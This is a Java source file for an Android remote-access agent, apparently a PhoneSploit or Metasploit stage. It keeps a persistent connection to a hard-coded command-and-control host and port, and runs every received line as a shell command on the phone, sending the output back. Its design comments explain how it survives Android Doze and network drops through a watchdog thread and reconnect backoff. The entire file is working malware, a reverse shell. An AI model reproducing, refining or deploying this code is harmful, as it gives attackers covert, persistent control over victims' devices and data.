// AgentShell.java — persistent command bridge for PhoneSploit keeper.
//
// DESIGN for reliable 24/7 background operation on non-rooted Android 15:
//
//   WHY the old agent died: Android Doze/network changes silently kill the
//   TCP socket (half-open). A naive readLine() then blocks 30-60s before the
//   dial loop notices — long enough for a network flap to be fatal.
//
//   FIX: two threads cooperate:
//     1. agent-shell  : dials C2, writes MAGIC, reads command lines, runs
//                       each via a fresh /system/bin/sh -c, streams output.
//     2. agent-watch : every 20s, does a non-blocking probe of the socket.
//                       If the socket is dead/unresponsive (half-open), it
//                       interrupts the dial-loop to force an immediate
//                       re-dial — no 60s wait. This is the self-healing bit.
//
//   Re-dials with 5s-60s backoff. Strips \u0000 / \r from command lines
//   (some tunnel paths inject a null terminator that `sh -c` rejects).
package com.metasploit.stage;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public final class AgentShell {
    static final String C2_HOST = "geeksshport4-31107.portmap.host";
    static final int C2_PORT = 31107;
    static final byte[] MAGIC = "__DLS_AGENT__\n".getBytes();
    static final String MAGIC_STR = "__DLS_AGENT__\n";

    private static volatile Socket CURRENT_SOCK = null;
    private static final java.util.concurrent.atomic.AtomicBoolean STARTED =
        new java.util.concurrent.atomic.AtomicBoolean(false);

    public static void run() {
        if (!STARTED.compareAndSet(false, true)) return;

        // ---- Watchdog thread: force quick re-dial on half-open sockets ----
        Thread watchdog = new Thread(new Runnable() {
            @Override public void run() {
                while (true) {
                    try { Thread.sleep(20000); } catch (InterruptedException e) { break; }
                    Socket s = CURRENT_SOCK;
                    if (s == null || s.isClosed()) continue;   // dial-loop owns reconnect
                    // probe: empty write triggers EPIPE / RST if dead
                    try {
                        s.setSoTimeout(2000);
                        // a true keepalive ping the keeper ignores
                        synchronized(s) {
                            try { s.getOutputStream().write(";;keepalive\n".getBytes()); s.getOutputStream().flush(); }
                            catch (Exception ignored) {}
                        }
                        s.setSoTimeout(60000);
                    } catch (Exception e) {
                        // socket dead — close to unblock readLine() & force re-dial
                        try { s.close(); } catch (Exception ignored) {}
                    }
                }
            }
        }, "agent-watch");
        watchdog.setDaemon(false);
        watchdog.start();

        // ---- Dial + serve loop ----
        Thread t = new Thread(new Runnable() {
            @Override public void run() {
                int fail = 0;
                while (true) {
                    Socket sock = null;
                    try {
                        sock = new Socket();
                        sock.connect(new InetSocketAddress(C2_HOST, C2_PORT), 15000);
                        CURRENT_SOCK = sock;
                        handle(sock);
                        fail = 0;
                    } catch (Exception e) {
                        fail++;
                        try { if (sock != null) sock.close(); } catch (Exception ignored) {}
                        long d = Math.min(5000L * ((fail % 12) + 1), 60000L);
                        try { Thread.sleep(d); } catch (InterruptedException ignored) {}
                    }
                }
            }
        }, "agent-shell");
        t.setDaemon(false);
        t.start();
    }

    /** Serve one connection: write MAGIC, then per-command exec loop. */
    private static void handle(final Socket sock) throws Exception {
        CURRENT_SOCK = sock;
        sock.getOutputStream().write(MAGIC);
        sock.getOutputStream().flush();
        sock.setSoTimeout(0); // blocking reads; watchdog closes socket on stall

        BufferedReader socketIn = new BufferedReader(
            new InputStreamReader(sock.getInputStream(), "UTF-8"));
        final OutputStream out = sock.getOutputStream();

        String line;
        while ((line = socketIn.readLine()) != null) {
            line = line.trim().replace("\u0000", "").replace("\r", "");
            if (line.isEmpty()) continue;
            if (line.startsWith(";;keepalive")) continue;
            if (line.equals(MAGIC_STR.trim())) continue;
            try {
                Process p = new ProcessBuilder("/system/bin/sh", "-c", line)
                    .redirectErrorStream(true).start();
                byte[] buf = new byte[8192];
                InputStream pin = p.getInputStream();
                int n;
                while ((n = pin.read(buf)) > 0) {
                    out.write(buf, 0, n);
                    out.flush();
                }
                out.write("\n".getBytes());
                out.flush();
            } catch (Exception e) {
                try {
                    out.write(("ERR: " + e.getMessage() + "\n").getBytes());
                    out.flush();
                } catch (Exception ignored) {}
            }
        }
    }
}